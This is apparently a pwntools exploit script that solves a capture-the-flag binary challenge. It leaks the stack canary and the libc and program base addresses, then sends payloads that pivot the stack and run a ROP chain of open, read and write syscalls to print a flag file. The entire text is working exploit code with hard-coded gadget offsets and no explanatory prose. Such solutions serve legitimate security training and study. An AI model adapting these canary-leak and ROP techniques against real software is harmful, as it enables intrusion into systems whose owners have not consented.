from pwn import *
from time import sleep

context.arch = 'amd64'

p = process('./chal')
# p = remote('10.113.184.121', 10056)
p.recvuntil(b"Haaton's name?")
p.sendline(b'A'*20 + b'HACHAMA\x00')
p.recvuntil(b'HACHAMA\x00\n')
p.recv(0x2f)
base = p.recv(0x31)
canary = u64(base[:8])
libc = u64(base[16:16+8]) - 0x29d90
code = u64(base[32:40]) - 0x1331
print("this is canary: ", hex(canary))
print("this is libc: ", hex(libc))
print("this is code: ", hex(code))

file_addr = b'/home/chal/flag.txt'.ljust(0x38, b'\x00')#/home/chal/flag.txt
# pop_rdx_rbx = libc + 0x0000000000090529
pop_rdx_ret = libc + 0x00000000000796a2
pop_rax = libc + 0x0000000000045eb0
pop_rsi = libc + 0x000000000002be51
pop_rdi = libc + 0x000000000002a3e5
# libc_open = libc + 0x0000000000114690
# libc_read = libc + 0x0000000000114980
# libc_write = libc + 0x0000000000114a20
syscall_ret = libc + 0x0000000000091316
#syscall = libc + 0x0000000000099e74

bss_addr = code + 0x4487
bss_addr_buf = code + 0x4878

trash_payload = flat([
    canary,
    bss_addr,
    code + 0x1454
])

extend_payload = flat([
    canary,
    bss_addr_buf,
    pop_rax, 400,
    code + 0x145b
])

open_payload = flat([
    pop_rax, 2,
    pop_rdi, bss_addr-0x40,
    pop_rdx_ret, 0,
    pop_rsi, 0,
    # libc_open
    syscall_ret
])

read_payload = flat([
    pop_rax, 0,
    pop_rdi, 3,
    pop_rsi, bss_addr_buf + 0xc0,
    pop_rdx_ret, 0x70,
    # libc_read,
    syscall_ret
])

write_payload = flat([
    pop_rax, 1,
    pop_rdi, 1, 
    # libc_write
    syscall_ret
])

raw_input('>')
p.send(b"C"*0x38 + trash_payload)
raw_input('>')
p.send(file_addr + extend_payload)
raw_input('>')
p.send(b"E"*0x38 + p64(canary) + p64(0) + open_payload + read_payload + write_payload)

p.interactive()